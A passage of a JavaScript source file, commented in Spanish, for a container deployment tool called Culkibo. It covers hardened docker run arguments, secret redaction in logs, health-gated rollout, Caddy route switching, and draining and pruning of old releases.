   * Los valores de las variables de entorno NO están aquí: `-e CLAVE` sin `=`
   * hace que docker lea el valor del entorno del proceso que lo lanza. Es la
   * diferencia entre un secreto visible en `ps` para cualquier usuario de la
   * máquina y un secreto que solo ve el hijo.
   */
  /**
   * @param {{containerName: string, imageTag: string, hostPort: number, containerPort: number,
   *   envNames?: string[], envFile?: string | null, network?: string | null, memoryMb?: number, cpus?: string | number,
   *   pidsLimit?: number, healthCmd?: string | null, labels?: Record<string, any>}} spec
   * @returns {string[]}
   */
  runArgs({
    containerName,
    imageTag,
    hostPort,
    containerPort,
    envNames = [],
    envFile = null,
    network = DEFAULTS.network,
    memoryMb = DEFAULTS.memoryMb,
    cpus = DEFAULTS.cpus,
    pidsLimit = DEFAULTS.pidsLimit,
    healthCmd = null,
    labels = {}
  }) {
    const args = [
      'run', '-d',
      '--name', containerName,
      // Reinicio ante caída del proceso o del host. Sin esto no es un servicio
      // de producción, es un proceso que casualmente está vivo.
      '--restart', 'unless-stopped',
      // El contenedor solo debe ser alcanzable por el proxy y por la sonda de
      // salud del daemon; nunca directamente desde internet.
      '-p', `127.0.0.1:${hostPort}:${containerPort}`,
      '--memory', `${memoryMb}m`,
      // Igualar swap a memoria desactiva el swap del contenedor: preferimos un
      // OOM rápido y visible a una app que agoniza intercambiando páginas.
      '--memory-swap', `${memoryMb}m`,
      '--cpus', String(cpus),
      '--pids-limit', String(pidsLimit),
      '--security-opt', 'no-new-privileges',
      '--cap-drop', 'ALL',
      ...(Number(containerPort) < 1024 ? ['--cap-add', 'NET_BIND_SERVICE'] : []),
      // Sin esto el log JSON de un contenedor hablador llena el disco del VPS.
      '--log-opt', 'max-size=10m',
      '--log-opt', 'max-file=3'
    ];

    if (network) args.push('--network', network);

    if (envFile) {
      args.push('--env-file', envFile);
    } else {
      for (const name of envNames) {
        if (isValidEnvName(name)) args.push('-e', name);
      }
    }

    if (healthCmd) {
      args.push('--health-cmd', healthCmd, '--health-interval', '10s', '--health-timeout', '3s', '--health-retries', '3', '--health-start-period', '10s');
    }

    for (const [key, value] of Object.entries(labels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).slice(0, 200)}`);
    }

    args.push(imageTag);
    return args;
  }

  // -------------------------------------------------------------------------
  // Utilidades de red y puertos
  // -------------------------------------------------------------------------

  /** Crea la red de Culkibo si no existe. Idempotente y cacheada 60 s. */
  async ensureNetwork(name = DEFAULTS.network) {
    const now = Date.now();
    const cachedAt = this._networkCache.get(name);
    if (cachedAt && (now - cachedAt) < 60000) return true;
    const inspect = await this.runDocker(['network', 'inspect', name], { timeoutMs: 8000 });
    if (inspect.code === 0) {
      this._networkCache.set(name, now);
      return true;
    }
    const created = await this.runDocker(['network', 'create', name], { timeoutMs: 10000 });
    if (created.code === 0) {
      this._networkCache.set(name, now);
      return true;
    }
    return false;
  }

  /**
   * ¿Con qué dirección debe hablar Caddy al contenedor?
   *
   * Si Caddy corre en un contenedor, `127.0.0.1` del host NO es su loopback:
   * marcarlo así produce una ruta que apunta a la nada. Lo correcto es
   * adjuntarlo a la red de Culkibo y marcar el nombre del contenedor. Si Caddy
   * corre nativo en el host, `127.0.0.1:<puertoHost>` sí es correcto.
   */
  async resolveUpstream({ containerName, containerPort, hostPort, network = DEFAULTS.network }) {
    const caddyName = DEFAULTS.caddyContainerName;
    const inspect = await this.runDocker(
      ['inspect', '-f', '{{json .NetworkSettings.Networks}}', caddyName],
      { timeoutMs: 8000 }
    );

    if (inspect.code !== 0) {
      // Caddy no es un contenedor de esta máquina: es nativo o remoto.
      return { dial: `127.0.0.1:${hostPort}`, mode: 'host' };
    }

    let networks = {};
    try { networks = JSON.parse((inspect.stdout || '{}').trim()) || {}; } catch (e) {}
    if (!networks[network]) {
      const connected = await this.runDocker(['network', 'connect', network, caddyName], { timeoutMs: 10000 });
      if (connected.code !== 0) {
        // No se pudo adjuntar: caemos al host, que al menos funciona si Caddy
        // publica puertos con acceso al gateway.
        return { dial: `127.0.0.1:${hostPort}`, mode: 'host', warning: connected.stderr.trim() };
      }
    }
    return { dial: `${containerName}:${containerPort}`, mode: 'network' };
  }

  /** Puerto libre en el host para publicar el contenedor nuevo (respeta puertos de current/previous y en vuelo, P1-8). */
  async findFreePort(start = 40000) {
    const net = require('net');
    const reserved = new Set(this._pendingPorts);
    for (const st of Object.values(this.store)) {
      if (st && st.current && st.current.hostPort) reserved.add(Number(st.current.hostPort));
      if (st && st.previous && st.previous.hostPort) reserved.add(Number(st.previous.hostPort));
    }
    const isFree = (port) => new Promise((resolve) => {
      const tester = net.createServer()
        .once('error', () => resolve(false))
        .once('listening', () => tester.once('close', () => resolve(true)).close())
        .listen(port, '127.0.0.1');
    });
    let port = start + Math.floor(Math.random() * 5000);
    for (let i = 0; i < 500; i++, port++) {
      if (port > 65000) port = start;
      if (reserved.has(port)) continue;
      if (await isFree(port)) {
        this._pendingPorts.add(port);
        return port;
      }
    }
    throw new Error('No se ha encontrado ningún puerto libre en el host');
  }

  // -------------------------------------------------------------------------
  // Registro y notificación
  // -------------------------------------------------------------------------

  /**
   * Elimina de un texto cualquier valor que coincida con un secreto conocido.
   *
   * La salida de un build o de un contenedor puede volcar el entorno (un
   * `console.log(process.env)`, un stack trace de una librería de config). Si
   * eso llega al log en vivo del panel, el secreto se filtra a cualquiera que
   * mire la pantalla.
   */
  redact(text, secrets = []) {
    let out = String(text == null ? '' : text);
    for (const secret of secrets) {
      if (typeof secret === 'string' && secret.length >= 8) {
        out = out.split(secret).join('***');
      }
    }
    return out;
  }

  log(deployment, level, message) {
    const safe = this.redact(message, deployment.__secrets || []).slice(0, 4000);
    const entry = { at: new Date().toISOString(), level, message: safe };
    deployment.logLines.push(entry);
    // Se conservan las últimas 800 líneas: suficiente para diagnosticar un
    // build fallido sin que un `npm ci` verboso reviente la memoria.
    if (deployment.logLines.length > 800) deployment.logLines.shift();

    if (containerOrchestrator) {
      containerOrchestrator.addLog(level, 'citadel', safe, new Date(), deployment.projectId);
    }
    this.emit('deploy_log', { deploymentId: deployment.id, projectId: deployment.projectId, ...entry });
  }

  setStatus(deployment, status, extra = {}) {
    deployment.status = status;
    Object.assign(deployment, extra);
    this.emit('deploy_event', {
      deploymentId: deployment.id,
      projectId: deployment.projectId,
      status,
      kind: deployment.kind || 'deploy',
      imageTag: deployment.imageTag,
      upstream: deployment.upstream,
      hostnames: deployment.hostnames,
      commit: (deployment.git && deployment.git.shortCommit) || null,
      startedAt: deployment.startedAt || null,
      finishedAt: deployment.finishedAt || null,
      durationMs: deployment.durationMs || null,
      error: deployment.error || null
    });
  }

  notify(payload) {
    if (!notificationService) return;
    Promise.resolve(notificationService.notify(payload)).catch(() => {});
  }

  // -------------------------------------------------------------------------
  // 4. Sonda de salud
  // -------------------------------------------------------------------------

  /**
   * Espera a que el destino nuevo responda antes de mandarle tráfico.
   *
   * Éste es el punto en el que un despliegue deja de ser «arranco y cruzo los
   * dedos». Dos condiciones de parada, no una:
   *
   *   a) el sondeo HTTP devuelve algo por debajo de 500 — el proceso escucha y
   *      enruta (un 404 en `/` es una app viva; un 502 no lo es);
   *   b) el contenedor deja de estar en ejecución — un crash-loop se detecta en
   *      el primer ciclo en vez de consumir los 30 s completos.
   */
  async waitForHealth({ hostPort, healthPath, containerName, timeoutMs, intervalMs, onProgress }) {
    const deadline = Date.now() + timeoutMs;
    const url = `http://127.0.0.1:${hostPort}${healthPath}`;
    let attempts = 0;
    let lastError = 'sin respuesta';
    const backoff = [100, 150, 250, 500];

    while (Date.now() < deadline) {
      attempts++;

      // Sondeo HTTP primero: si el servicio ya está listo ahorra un `docker inspect` por intento.
      try {
        const res = await fetch(url, { redirect: 'manual', signal: AbortSignal.timeout(Math.min(5000, Math.max(1000, intervalMs * 4))) });
        if (res.status < 500) {
          return { healthy: true, attempts, status: res.status };
        }
        lastError = `respondió ${res.status}`;
      } catch (err) {
        lastError = err.name === 'TimeoutError' ? 'tiempo de espera agotado' : 'conexión rechazada';
      }

      // Solo comprobar si el contenedor murió cuando el HTTP aún no responde.
      if (containerName) {
        const state = await this.runDocker(['inspect', '-f', '{{.State.Running}}', containerName], { timeoutMs: 5000 });
        if (state.code === 0 && (state.stdout || '').trim() === 'false') {
          return { healthy: false, attempts, reason: 'El contenedor se detuvo durante el arranque (revisa los logs de la build)' };
        }
      }

      if (onProgress && attempts % 5 === 0) {
        onProgress(`Esperando a que el servicio responda en ${healthPath} (intento ${attempts}: ${lastError})`);
      }
      const waitMs = attempts <= backoff.length ? Math.min(intervalMs, backoff[attempts - 1]) : intervalMs;
      await new Promise(r => setTimeout(r, waitMs));
    }

    return { healthy: false, attempts, reason: `No respondió en ${Math.round(timeoutMs / 1000)} s (${lastError})` };
  }

  // -------------------------------------------------------------------------
  // 5. Despliegue
  // -------------------------------------------------------------------------

  /** Hostnames públicos del proyecto, en el orden en que deben registrarse. */
  hostnamesFor(project) {
    const raw = Array.isArray(project.domains) ? project.domains : [];
    const clean = raw
      .map(d => String(typeof d === 'string' ? d : (d && d.hostname) || '').trim().toLowerCase())
      .filter(d => /^(\*\.)?([a-z0-9]([a-z0-9-]*[a-z0-9])?\.)+[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(d));
    return Array.from(new Set(clean));
  }

  /** Serializa despliegues del mismo proyecto: dos a la vez es corrupción segura. */
  async deploy(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');
    const inFlight = this.locks.get(project.id);
    if (inFlight) {
      throw new Error('Ya hay un despliegue en curso para este proyecto');
    }
    const task = this._deploy(project, options).finally(() => {
      if (this.locks.get(project.id) === task) this.locks.delete(project.id);
      this.drainPending(project.id);
    });
    this.locks.set(project.id, task);
    return task;
  }

  /**
   * Como `deploy()`, pero si ya hay uno en curso lo deja encolado en vez de
   * fallar.
   *
   * Existe por el webhook: durante un build de varios minutos es normal que
   * lleguen más pushes, y rechazarlos deja la rama desplegada por detrás del
   * repositorio sin que nadie se entere. Rechazar es correcto para un botón
   * («ya hay uno en curso», el usuario lo ve); para un disparo automático no lo
   * es.
   *
   * @returns {{started: boolean, queued: boolean, promise?: Promise<any>}}
   */
  enqueue(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');
    if (this.locks.has(project.id)) {
      this.pending.set(project.id, { project, options });
      return { started: false, queued: true };
    }
    const promise = this.deploy(project, options);
    promise.catch(() => {});
    return { started: true, queued: false, promise };
  }

  /** Lanza el despliegue que quedó en espera, si lo hay. */
  drainPending(projectId) {
    const next = this.pending.get(projectId);
    if (!next) return;
    this.pending.delete(projectId);
    if (this.locks.has(projectId)) return; // otro se adelantó; el suyo drenará
    const promise = this.deploy(next.project, next.options);
    promise.catch(() => {});
  }

  async _deploy(project, options = {}) {
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(project.id);
    const slug = safeSlug(project.id);
    const version = options.version
      ? safeSlug(options.version, 'v')
      : `b${Date.now().toString(36)}`;

    const envVars = { ...(project.envVars || {}) };
    const envNames = Object.keys(envVars).filter(isValidEnvName);
    const rejectedEnv = Object.keys(envVars).filter(k => !isValidEnvName(k));

    const suffix = crypto.randomBytes(3).toString('hex');
    /** @type {any} */
    const deployment = {
      id: `dep_${Date.now()}_${suffix}`,
      projectId: project.id,
      projectName: project.name || project.id,
      status: 'pendiente',
      imageTag: `culkibo/${slug}:${version}`,
      // Sufijo aleatorio: evita colisiones si el usuario redespliega la misma `version`
      // y garantiza que `forceRemove` jamás pueda tocar el contenedor activo.
      containerName: `culkibo_${slug}_${version}_${suffix}`,
      hostPort: null,
      containerPort: null,
      upstream: null,
      hostnames: this.hostnamesFor(project),
      routeSwitched: false,
      strategy: null,
      /** Qué código es esto exactamente. Lo rellena la sincronización con git. */
      git: null,
      trigger: options.trigger || 'manual',
      previous: state.current ? { ...state.current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    // No se persiste: solo sirve para redactar la salida en vivo (incluye envVars + buildArgs, P1-31).
    const allSecretValues = [
      ...Object.values(envVars),
      ...Object.values(project.buildArgs || {})
    ];
    Object.defineProperty(deployment, '__secrets', { value: allSecretValues, enumerable: false });

    state.history.unshift(deployment);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      deployment.finishedAt = new Date().toISOString();
      deployment.durationMs = Date.now() - started;
      deployment.error = error;
      this.setStatus(deployment, status);
      this.saveStore();
      return deployment;
    };

    try {
      // --- 0. Requisitos --------------------------------------------------
      const docker = await this.detectDocker({ force: true });
      if (!docker.available) {
        this.log(deployment, 'ERROR', `No se puede desplegar: ${docker.reason}.`);
        return finish('fallido', docker.reason);
      }

      const rootContextDir = options.contextDir || path.join(ROOT_BASE_DIR, 'projects', project.id);
      let contextDir = rootContextDir;
      if (!options.contextDir && project.baseDirectory && project.baseDirectory !== '/' && project.baseDirectory !== '.') {
        try {
          contextDir = assertContainedPath(rootContextDir, String(project.baseDirectory).replace(/^\/+/, ''));
        } catch (e) {
          this.log(deployment, 'WARN', `baseDirectory inválido ignorado (${project.baseDirectory}): ${e.message}`);
        }
      }

      // --- 0.5. Código fuente ---------------------------------------------
      //
      // Antes se construía lo que hubiera en el directorio. Eso significa que
      // «desplegar» podía servir un clon de hace tres semanas sin que nada en
      // la interfaz lo delatase, y que el historial de despliegues no podía
      // responder a la única pregunta que importa después de una caída: qué
      // commit hay en producción.
      //
      // Se salta cuando la llamada trae su propio `contextDir` (las pruebas y
      // los despliegues desde un directorio suelto) o con `gitSync: false`.
      if (!options.contextDir && options.gitSync !== false) {
        this.setStatus(deployment, 'sincronizando');
        const sync = await repoSync.sync(project, {
          commit: options.commit || null,
          onLine: (line) => this.log(deployment, 'INFO', line)
        });

        if (!sync.ok) {
          this.log(deployment, 'ERROR', `No se pudo obtener el código: ${sync.error}`);
          return finish('fallido', sync.error);
        }

        deployment.git = {
          branch: sync.branch,
          commit: sync.commit,
          shortCommit: sync.shortCommit,
          subject: sync.subject,
          author: sync.author,
          committedAt: sync.committedAt || null,
          action: sync.action,
          previousCommit: sync.previousCommit,
          discardedChanges: (sync.dirtyFiles || []).length
        };

        if (sync.action === 'omitido') {
          this.log(deployment, 'WARN', sync.reason);
        } else {
          const verb = sync.action === 'clonado'
            ? 'Repositorio clonado'
            : sync.action === 'sin-cambios'
              ? 'El repositorio ya estaba al día'
              : 'Repositorio actualizado';
          this.log(
            deployment,
            'INFO',
            `${verb}: ${sync.shortCommit} en «${sync.branch}»${sync.subject ? ` — ${sync.subject}` : ''}${sync.author ? ` (${sync.author})` : ''}`
          );
        }
      }

      if (!fs.existsSync(contextDir)) {
        const msg = `No hay código en ${contextDir}. Clona el repositorio del proyecto antes de desplegar.`;
        this.log(deployment, 'ERROR', msg);
        return finish('fallido', msg);
      }

      if (rejectedEnv.length > 0) {
        this.log(deployment, 'WARN', `Variables de entorno ignoradas por nombre inválido: ${rejectedEnv.join(', ')}`);
      }

      // --- 1. Estrategia --------------------------------------------------
      const strategy = await this.detectStrategy(contextDir, project);
      deployment.strategy = {
        builder: strategy.builder,
        stack: strategy.stack,
        containerPort: strategy.containerPort,
        healthPath: strategy.healthPath,
        reason: strategy.reason
      };
      deployment.containerPort = strategy.containerPort;
      this.log(deployment, 'INFO', `Estrategia de construcción: ${strategy.reason}`);

      if (strategy.builder === 'generated' && strategy.stack === 'desconocido') {
        const msg = 'No se ha podido determinar cómo construir este proyecto. Añade un Dockerfile al repositorio o instala railpack.';
        this.log(deployment, 'ERROR', msg);
        return finish('fallido', msg);
      }

      // --- 2. Construcción -------------------------------------------------
      this.setStatus(deployment, 'construyendo');
      const buildOk = await this.runBuild(deployment, { strategy, contextDir, project, opts, envVars });
      if (!buildOk.ok) return finish('fallido', buildOk.error);

      // --- 3. Arranque del contenedor nuevo --------------------------------
      this.setStatus(deployment, 'arrancando');
      await this.ensureNetwork(opts.network);

      const hostPort = await this.findFreePort();
      deployment.hostPort = hostPort;

      /** @type {string | null} */
      let envFile = null;
      let run;
      try {
        if (envNames.length > 0) {
          fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
          envFile = path.join(TMP_ENV_DIR, `depenv_${crypto.randomBytes(8).toString('hex')}`);
          const lines = envNames.map(k => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n]+/g, ' ')}`);
          fs.writeFileSync(envFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
        }

        const rawMem = Number(project.memoryMb);
        const safeMemMb = Number.isInteger(rawMem) && rawMem >= 32 && rawMem <= 65536 ? rawMem : opts.memoryMb;

        const runArgs = this.runArgs({
          containerName: deployment.containerName,
          imageTag: deployment.imageTag,
          hostPort,
          containerPort: strategy.containerPort,
          envNames: envFile ? [] : envNames,
          envFile,
          network: opts.network,
          memoryMb: safeMemMb,
          cpus: /^[0-9]+(\.[0-9]+)?$/.test(String(project.cpus || '')) ? String(project.cpus) : opts.cpus,
          pidsLimit: opts.pidsLimit,
          healthCmd: strategy.injectHealthcheck ? this.healthCommandFor(strategy) : null,
          labels: {
            'com.culkibo.project': safeSlug(project.id),
            'com.culkibo.deployment': deployment.id,
            'com.culkibo.version': version
          }
        });

        run = await this.runDocker(runArgs, { timeoutMs: 60000 });
      } finally {
        this._pendingPorts.delete(hostPort);
        if (envFile) {
          try { fs.unlinkSync(envFile); } catch (e) {}
        }
      }
      const protectedContainers = new Set(
        [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
      );
      if (run.code !== 0) {
        const msg = this.redact(run.stderr.trim() || `docker run terminó con código ${run.code}`, Object.values(envVars));
        this.log(deployment, 'ERROR', `No se pudo arrancar el contenedor: ${msg}`);
        await this.forceRemove(deployment.containerName, protectedContainers);
        return finish('fallido', msg);
      }
      this.log(deployment, 'INFO', `Contenedor ${deployment.containerName} arrancado en 127.0.0.1:${hostPort}`);

      // --- 4. Puerta de salud ---------------------------------------------
      // Todavía NO se ha tocado la ruta. Si esto falla, la versión anterior
      // sigue sirviendo y el usuario no se entera de nada malo.
      this.setStatus(deployment, 'verificando');
      const health = await this.waitForHealth({
        hostPort,
        healthPath: strategy.healthPath,
        containerName: deployment.containerName,
        timeoutMs: opts.healthTimeoutMs,
        intervalMs: opts.healthIntervalMs,
        onProgress: (m) => this.log(deployment, 'INFO', m)
      });

      if (!health.healthy) {
        this.log(deployment, 'ERROR', `La versión nueva no pasó la verificación de salud: ${health.reason}`);
        await this.captureContainerLogs(deployment, deployment.containerName);
        await this.forceRemove(deployment.containerName, protectedContainers);
        this.notify({
          event: 'deploy_failed',
          level: 'error',
          title: 'Despliegue abortado',
          message: `${deployment.projectName}: la versión nueva no pasó la verificación de salud (${health.reason}). La versión anterior sigue sirviendo tráfico.`,
          projectId: project.id,
          projectName: deployment.projectName
        });
        return finish('fallido', health.reason);
      }
      this.log(deployment, 'SUCCESS', `Verificación de salud superada (HTTP ${health.status} tras ${health.attempts} intentos)`);

      // --- 5. Conmutación de la ruta ---------------------------------------
      this.setStatus(deployment, 'promocionando');
      const upstream = await this.resolveUpstream({
        containerName: deployment.containerName,
        containerPort: strategy.containerPort,
        hostPort,
        network: opts.network
      });
      deployment.upstream = upstream.dial;
      if (upstream.warning) this.log(deployment, 'WARN', `No se pudo adjuntar Caddy a la red ${opts.network}: ${upstream.warning}`);

      if (deployment.hostnames.length === 0) {
        this.log(deployment, 'WARN', 'El proyecto no tiene dominios asignados: el servicio queda accesible solo en el host. Añade un dominio para publicarlo.');
      } else {
        const switched = await this.switchRoute(deployment, deployment.hostnames, upstream.dial);
        if (!switched.ok) {
          // No se promociona a medias: si la ruta no se puede mover, el
          // contenedor nuevo se retira y la versión anterior sigue intacta.
          this.log(deployment, 'ERROR', `No se pudo conmutar la ruta: ${switched.error}. Se conserva la versión anterior.`);
          await this.forceRemove(deployment.containerName, protectedContainers);
          return finish('fallido', switched.error);
        }
      }

      // --- 6. Promoción del registro ---------------------------------------
      /** @type {any} */
      const release = {
        deploymentId: deployment.id,
        projectName: deployment.projectName,
        imageTag: deployment.imageTag,
        containerName: deployment.containerName,
        hostPort,
        containerPort: strategy.containerPort,
        upstream: deployment.upstream,
        healthPath: strategy.healthPath,
        hostnames: deployment.hostnames,
        version,
        // Viaja con la release, no solo con el registro del despliegue: el
        // diálogo de rollback tiene que poder decir a QUÉ commit vuelve, y para
        // eso el commit debe estar en el ancla, no en el historial.
        git: deployment.git,
        promotedAt: new Date().toISOString()
      };
      const retiring = state.current;
      state.previous = retiring || null;
      state.current = release;
      this.saveStore();

      // --- 7. Drenaje del viejo, en segundo plano ---------------------------
      // El contenedor viejo sigue VIVO durante la ventana de drenaje. La ruta
      // ya no le manda peticiones nuevas, pero las que estaban en vuelo
      // terminan contra él. Matarlo a la vez que se conmuta es exactamente lo
      // que produce los 502/503 del issue #8627 de Coolify.
      if (retiring && retiring.containerName !== deployment.containerName) {
        const drain = this.drainAndRetire(deployment, retiring, opts)
          .catch(err => this.log(deployment, 'WARN', `Fallo al retirar la versión anterior: ${err.message}`))
          .finally(() => { if (this.drains.get(project.id) === drain) this.drains.delete(project.id); });
        this.drains.set(project.id, drain);
      }

      this.log(deployment, 'SUCCESS', `Despliegue completado en ${((Date.now() - started) / 1000).toFixed(1)} s — sirviendo ${deployment.imageTag}`);
      this.notify({
        event: 'deploy_succeeded',
        level: 'success',
        title: 'Despliegue completado',
        message: `${deployment.projectName} está sirviendo ${deployment.imageTag}${deployment.hostnames.length ? ` en ${deployment.hostnames.join(', ')}` : ''}.`,
        projectId: project.id,
        projectName: deployment.projectName
      });
      return finish('activo');
    } catch (err) {
      this.log(deployment, 'ERROR', `Error inesperado en el despliegue: ${err.message}`);
      const protectedSet = new Set(
        [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
      );
      try { await this.forceRemove(deployment.containerName, protectedSet); } catch (e) {}
      return finish('fallido', err.message);
    }
  }

  /** Ejecuta el constructor elegido y transmite su salida como eventos de log. */
  async runBuild(deployment, { strategy, contextDir, project, opts, envVars }) {
    const secrets = [...Object.values(envVars), ...Object.values(project.buildArgs || {})];
    const onLine = (line) => this.log(deployment, 'INFO', line);

    if (strategy.builder === 'railpack' || strategy.builder === 'nixpacks') {
      const envNames = Object.keys(envVars).filter(isValidEnvName);
      const args = this.externalBuilderArgs(strategy.builder, {
        imageTag: deployment.imageTag,
        contextDir,
        envNames: strategy.builder === 'nixpacks' ? envNames : []
      });
      this.log(deployment, 'INFO', `Construyendo con ${strategy.builder}: ${deployment.imageTag}`);
      const res = await this.runTool(strategy.builder, args, {
        timeoutMs: opts.buildTimeoutMs,
        cwd: contextDir,
        // Nixpacks genera un Dockerfile y llama al CLI de docker, forzando
        // DOCKER_BUILDKIT=1 por su cuenta; se lo damos igualmente. Railpack no
        // usa el CLI para construir, pero sí `docker load` al final, y lee
        // BUILDKIT_HOST del entorno. Los valores de las variables van aquí para
        // que la forma `--env NOMBRE` de nixpacks los encuentre.
        env: { ...process.env, DOCKER_BUILDKIT: '1', ...filterSafeHostEnv(envVars) },
        onLine
      });
      if (res.code !== 0) {
        const msg = this.redact(res.stderr.trim() || `${strategy.builder} terminó con código ${res.code}`, secrets);
        this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
        return { ok: false, error: msg.slice(0, 600) };
      }
      return { ok: true };
    }

    let dockerfile = strategy.dockerfile;
    if (strategy.builder === 'generated') {
      const text = this.generateDockerfile(strategy);
      if (!text) return { ok: false, error: 'No se ha podido generar un Dockerfile para este stack' };
      // Se escribe en .culkibo/ y no en la raíz: el repositorio del usuario no
      // se modifica, y si más adelante añade su propio Dockerfile, gana el suyo.
      const genDir = path.join(contextDir, '.culkibo');
      fs.mkdirSync(genDir, { recursive: true });
      fs.writeFileSync(path.join(genDir, 'Dockerfile'), text, 'utf8');
      const genIgnore = path.join(genDir, 'Dockerfile.dockerignore');
      if (!fs.existsSync(path.join(contextDir, '.dockerignore'))) {
        fs.writeFileSync(genIgnore, this.defaultDockerignore(), 'utf8');
      } else if (fs.existsSync(genIgnore)) {
        // P1-31: eliminar .dockerignore autogenerado obsoleto si el usuario añadió uno propio
        try { fs.unlinkSync(genIgnore); } catch (e) {}
      }
      dockerfile = path.join('.culkibo', 'Dockerfile');
      this.log(deployment, 'INFO', `Dockerfile generado en .culkibo/Dockerfile (stack: ${strategy.stack}, BuildKit cache mounts activos)`);
    }

    const buildArgNames = Object.keys(project.buildArgs || {}).filter(isValidEnvName);
    const args = this.buildArgs({
      imageTag: deployment.imageTag,
      contextDir,
      dockerfile,
      buildArgNames,
      labels: {
        'com.culkibo.project': safeSlug(project.id),
        'com.culkibo.deployment': deployment.id
      }
    });

    this.log(deployment, 'INFO', `Construyendo imagen ${deployment.imageTag}...`);
    const res = await this.runDocker(args, {
      timeoutMs: opts.buildTimeoutMs,
      cwd: contextDir,
      // Los valores de los build args viajan por el entorno, igual que los de
      // ejecución. `--build-arg NOMBRE` sin `=` los toma de aquí.
      env: { ...process.env, DOCKER_BUILDKIT: '1', ...filterSafeHostEnv(project.buildArgs || {}) },
      onLine
    });

    if (res.code !== 0) {
      const msg = this.redact(res.stderr.trim() || `docker build terminó con código ${res.code}`, secrets);
      this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
      this.notify({
        event: 'deploy_failed',
        level: 'error',
        title: 'Fallo de construcción',
        message: `${deployment.projectName}: la imagen no se pudo construir.\n\n${msg.slice(0, 600)}`,
        projectId: deployment.projectId,
        projectName: deployment.projectName
      });
      return { ok: false, error: msg.slice(0, 600) };
    }

    this.log(deployment, 'SUCCESS', `Imagen ${deployment.imageTag} construida`);
    return { ok: true };
  }

  /**
   * Mueve la ruta del proyecto al destino nuevo.
   *
   * `upsertRoute` hace PATCH sobre el `@id` de la ruta: Caddy lo aplica de forma
   * atómica y, si la configuración fuese inválida, revierte sola. No hay
   * ventana en la que la ruta no exista.
   */
  async switchRoute(deployment, hostnames, dial) {
    try {
      const detection = await caddyManager.detect();
      if (!detection.available) {
        return { ok: false, error: `Caddy no está disponible: ${detection.reason}` };
      }
      await caddyManager.upsertRoute({
        projectId: deployment.projectId,
        hostnames,
        upstreams: [dial]
      });
      deployment.routeSwitched = true;
      this.log(deployment, 'SUCCESS', `Ruta conmutada: ${hostnames.join(', ')} -> ${dial}`);
      return { ok: true };
    } catch (err) {
      return { ok: false, error: err.message };
    }
  }

  /**
   * Retira la versión anterior después de la ventana de drenaje.
   *
   * Orden, y el orden es todo el asunto:
   *   1. la ruta YA apunta al contenedor nuevo (hecho antes de llamar aquí);
   *   2. se espera `drainTimeoutMs` con el viejo todavía sirviendo lo que tenía
   *      en vuelo;
   *   3. `docker stop --time=<gracia>`: SIGTERM, margen para cerrar, SIGKILL;
   *   4. NO se borra. El contenedor parado y su imagen son el ancla del
   *      rollback: volver atrás es arrancarlo y mover la ruta, no reconstruir.
   *
   * Diferencia conocida con kamal-proxy: él sabe qué peticiones tiene en vuelo
   * (lleva un `inflightMap` por destino) y termina en cuanto la última acaba,
   * cancelando de entrada las conexiones promocionadas —WebSockets— porque
   * pueden durar horas. Culkibo no tiene esa contabilidad: el proxy es Caddy y
   * no nos la expone. Así que esperamos la ventana completa, que es más lento
   * pero nunca corta antes de tiempo. El `stream_close_delay` de 5 s que
   * `caddyManager.buildRoute()` pone en el handler cubre el caso del streaming
   * durante la recarga de configuración.
   */
  async drainAndRetire(deployment, retiring, opts) {
    // P0-3: cancelar cualquier drenaje previo del proyecto, usar un timer cancelable y unref'd,
    // y re-verificar `state.current` tras despertar para jamás matar el contenedor vivo tras rollback.
    const projectId = deployment.projectId;
    this.cancelDrain(projectId);
    this.log(deployment, 'INFO', `Drenando ${retiring.containerName} durante ${Math.round(opts.drainTimeoutMs / 1000)} s antes de detenerlo`);

    const cancelled = await new Promise((resolve) => {
      const timer = setTimeout(() => {
        if (this._drainTimers.get(projectId)?.timer === timer) {
          this._drainTimers.delete(projectId);
        }
        resolve(false);
      }, opts.drainTimeoutMs);
      if (timer.unref) timer.unref();
      this._drainTimers.set(projectId, { timer, resolve });
    });

    if (cancelled) return;

    const latestState = this.store[projectId];
    if (!latestState || (latestState.current && latestState.current.containerName === retiring.containerName)) {
      this.log(deployment, 'INFO', `Drenaje omitido para ${retiring.containerName}: sigue siendo la versión activa`);
      return;
    }

    const stop = await this.runDocker(
      ['stop', '--time', String(opts.stopGraceSeconds), retiring.containerName],
      { timeoutMs: (opts.stopGraceSeconds + 20) * 1000 }
    );
    if (stop.code === 0) {
      this.log(deployment, 'INFO', `Versión anterior detenida: ${retiring.containerName} (se conserva para el rollback)`);
    } else {
      this.log(deployment, 'WARN', `No se pudo detener ${retiring.containerName}: ${stop.stderr.trim()}`);
    }

    await this.pruneOldReleases(projectId, opts.keepReleases);
    this.saveStore();
  }

  async pruneOldReleases(projectId, keep = DEFAULTS.keepReleases) {
    const state = this.getState(projectId);
    const alive = new Set([state.current, state.previous].filter(Boolean).map(r => r.containerName));
    const aliveImages = new Set([state.current, state.previous].filter(Boolean).map(r => r.imageTag));

    const list = await this.runDocker(
      ['ps', '-a', '--filter', `label=com.culkibo.project=${safeSlug(projectId)}`, '--format', '{{.Names}}'],
      { timeoutMs: 10000 }
    );
    if (list.code !== 0) return { removed: [], removedImages: [] };

    /** @type {string[]} */
    const removed = [];
    for (const name of (list.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
      if (alive.has(name)) continue;
      const res = await this.runDocker(['rm', '-f', name], { timeoutMs: 20000 });
      if (res.code === 0) removed.push(name);
    }

